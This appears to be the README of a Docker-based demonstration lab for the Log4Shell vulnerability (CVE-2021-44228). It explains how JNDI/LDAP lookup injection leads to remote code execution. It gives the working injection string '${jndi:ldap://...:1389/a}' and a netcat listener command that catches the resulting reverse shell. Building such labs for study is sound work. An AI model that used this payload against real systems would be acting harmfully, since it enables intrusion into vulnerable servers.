# An LDAP RCE exploit for CVE-2021-44228 Log4Shell

## Disclaimer

This repository is forked from: <https://github.com/cyberxml/log4j-poc>

The remote exploit app in this demo is based on that found at <https://github.com/kozmer/log4j-shell-poc>

The RMI exploit against the Tomcat 9 / Java 11 server is described here: <https://www.veracode.com/blog/research/exploiting-jndi-injections-java> (Jan 3, 2019) by Michael Stepankin

## Fundamentals

This repository consist of of two different docker-containers to demonstrate the log4j vulnerability.

The following explains the technologies used in this demonstration and the log4j vulnerability.

**log4j**: log4j is a popular logging library for java

**jndi**: _java naming and directory Interface_ is a Java API that allows JAva software clients to look up data. This data can ba supplied by a server, database or file.

**ldap**: _Lightweight Directory Access Protocol_ is a network protocol used to access distributed data. It is e.g. implemented as a service provider in the previously described jndi.

**expression evaluation**: This technology is used to e.g. dynamically write changing values in logging files. For example if you want to log the current user, one can write the following code:

```
 logger.debug("User {} is the current user.", currentUser);
```

In this case, java tries to evaluate the value of the variable currentUser and replaces the placeholder bracket with the result.

---

## How Remote Code Execution can be achieved

By introducing th jndi lookup feature in log4j, a vulnerability was created.
A possible exploit could look like the following steps:

1. The attacker sends a jndi lookup command to the application. This command contains a url where the application should fetch data.
2. The application wants to log the jndi command and therefore tries to fetch data from the url handed over.
3. The application connects to a prepared LDAP server which receives the fetch request and answers with malicious code.
4. This code is then executed by the attacked server.

---

## Demonstration

To demonstrate the log4j vulnerability two separate docker containers are created. The first one (cve-web) contains a Tomcat 8 server which can be accessed by port 8080. This server has a vulnerable app (log4shell) deployed on it.
The second container (cve-poc) is used to attack the vulnerable server. To communicate with the vulnerable server, it hosts a ldap server.

### Prerequisites

This code requires Docker and Docker Compose

### Installation

- edit docker-compose.yml file:
  - change value of #LISTENER_ADDR to the local IP of your docker host
- build docker containers:

```
docker-compose build
```

### Run Web App Attack Demo

- Setup your netcat listener in the first terminal

```
    nc -lv 10.10.10.31 9001
```

- Start the docker containers in a second terminal

```
   docker-compose up
```

- Navigate to <http://10.10.10.31:8080/log4shell>
- Login as "regular" user:
  - Enter the username: `admin`
  - Enter the password: `password`
  - Press the "login" button
- try out log4j vulnerability
  - Return to login at <http://10.10.10.31:8080/log4shell>
  - Enter the username `${jndi:ldap://172.16.238.11:1389/a}`
  - Select the "login" button
  - Check for connection on your `nc` listener
